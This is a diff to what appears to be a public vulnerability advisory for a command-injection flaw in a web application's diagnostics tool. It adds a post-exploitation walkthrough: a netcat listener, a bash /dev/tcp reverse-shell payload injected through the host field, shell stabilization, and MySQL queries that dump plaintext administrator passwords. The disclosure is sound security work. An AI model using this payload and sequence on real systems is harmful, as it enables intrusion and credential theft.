@@ -82,39 +82,99 @@ The tester repeated the injection with no session cookie set. The request carrie
 
 <img width="1814" height="960" alt="image" src="https://github.com/user-attachments/assets/93c4d44d-ba1f-4578-a005-ce4370731931" />
 
+## Post-Exploitation: Interactive Shell
 
-### reverse shell
+The command injection was escalated from single commands to a full interactive foothold, then used to compromise the database and recover administrator credentials, demonstrating the end-to-end impact of the flaw.
 
-injecting payload and listener opening session:
+### Reverse shell
 
-<img width="1925" height="847" alt="image" src="https://github.com/user-attachments/assets/421d76c8-e4a2-4543-90bb-cc7b017c4d10" />
+A listener was started on the attacking host:
 
-stabilizing shell
+```bash
+rlwrap nc -lvnp 4444
+```
+
+A reverse-shell payload was then injected through the `host` field:
+
+```
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.77.2/4444 0>&1'
+```
+
+The semicolon runs the payload after the ping, `bash -c` forces execution in bash, and bash's `/dev/tcp` feature opens a connection back to the listener, returning a shell as `www-data`.
+
+<!-- paste your reverse-shell screenshot here (payload injection + listener opening the session); the tag you sent came through malformed -->
+
+### Stabilizing the shell
+
+The raw netcat shell has no job control or terminal features, so it was upgraded to a proper pseudo-terminal.
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+- `script` is a standard Linux utility that normally records a terminal session. Invoked this way it spawns an interactive bash inside a pseudo-terminal (PTY), which is what upgrades the limited shell into one that supports interactive programs and job control. `-q` suppresses its banner, `-c /bin/bash` is the command to run, and `/dev/null` discards the session log.
+
+Then, on the attacking host:
+
+```bash
+[Ctrl+Z]
+stty raw -echo; fg
+```
+
+- **Ctrl+Z** suspends the remote shell and hands control back to the local terminal so its settings can be changed.
+- `stty raw` puts the local terminal into raw mode so that keystrokes, including Ctrl+C, Tab, and the arrow keys, pass straight through to the remote shell instead of being interpreted locally.
+- `-echo` disables local echo, since the remote PTY now handles displaying typed input.
+- `fg` brings the suspended shell back to the foreground.
+
+Finally, in the shell:
+
+```bash
+export TERM=xterm
+```
+
+- Sets the terminal type so full-screen programs such as `clear`, `nano`, and `vim` know how to control the display.
+
+The result is a fully interactive terminal as `www-data`.
 
 <img width="630" height="194" alt="image" src="https://github.com/user-attachments/assets/a5fde40a-a2e7-4411-8b23-67543880ab7a" />
 
-db creds:
+### Mapping the database
 
-<img width="1147" height="293" alt="image" src="https://github.com/user-attachments/assets/0baeef1c-5840-42f8-9ae8-e853797d6c45" />
+From the shell, the database was accessed directly as the MySQL root account, which the install notes disclosed uses no password, and the tables were enumerated:
 
-mysql tables output
+```bash
+mysql -u root oas -e "show tables;"
+```
+
+This revealed the schema, including `t_admin` (administrator credentials), `t_user`, `t_user_data`, `t_userdoc`, and `t_usermark`.
 
 <img width="666" height="206" alt="image" src="https://github.com/user-attachments/assets/3de6c8c7-ef1a-485c-a388-3ddff5d8ca43" />
 
-ls la of the webserver root
+### Reviewing the application source
+
+A listing of the web root exposed the full application source. The three document upload directories (`studentdoc`, `studentpic`, `studentproof`) are owned by `www-data` and are writable, while the core application files are owned by root. This confirms the shell account can write into web-reachable directories, which supports the separate file-upload findings.
 
 <img width="657" height="1084" alt="image" src="https://github.com/user-attachments/assets/ed914875-b5ac-41ac-8b1c-d8df53fda267" />
 
-getting passwords from the admins table
+### Recovering administrator credentials
+
+Finally, the administrator table was queried:
+
+```bash
+mysql -u root oas -e "select * from t_admin;"
+```
+
+The passwords are stored in plaintext in the `ad_pswd` column, so every administrator credential, including the super-admin `AD00000001`, was recovered directly with no cracking required. This plaintext storage is itself a separate finding (cleartext storage of credentials, CWE-256).
+
+> Redact the `ad_pswd` values in this screenshot before committing, since the repository is public.
 
 <img width="742" height="184" alt="image" src="https://github.com/user-attachments/assets/55336c34-a550-4446-9603-ecc047fe15c3" />
-
 
 ## Impact
 
 This is a critical vulnerability. Any unauthenticated attacker who can reach the diagnostics tool gains arbitrary command execution on the server as the `www-data` account, which includes reading local files such as `/etc/passwd` and the application source. Command execution reaches the local MySQL service, which runs as root with no password, so the attacker can read, modify, or delete the entire `oas` database, including applicant personal data, stored credentials, marks, and administrator accounts. A single unauthenticated web request therefore leads to total compromise of the application and its data.
 
-Execution occurs as `www-data` inside a container, since the hostname `362d0d1c6207` is a container identifier, which limits host-level reach. The application and its database are reachable from that same context, so the practical impact remains full compromise of the application and its data. A reverse shell and full database exfiltration were achievable from this position but were not performed, in order to limit impact during testing.
+Execution occurs as `www-data` inside a container, since the hostname `362d0d1c6207` is a container identifier, which limits host-level reach. The application and its database are reachable from that same context, so the practical impact remains full compromise of the application and its data. The command injection was escalated to an interactive reverse shell as `www-data`, which was then used to access the MySQL database as root and recover the full administrator credential store, which is stored in plaintext (see Post-Exploitation above). Establishing persistence, such as planting a web shell, cron job, or SSH key, and pivoting to other hosts were not performed, in order to limit impact during testing.
 
 ## Remediation
 
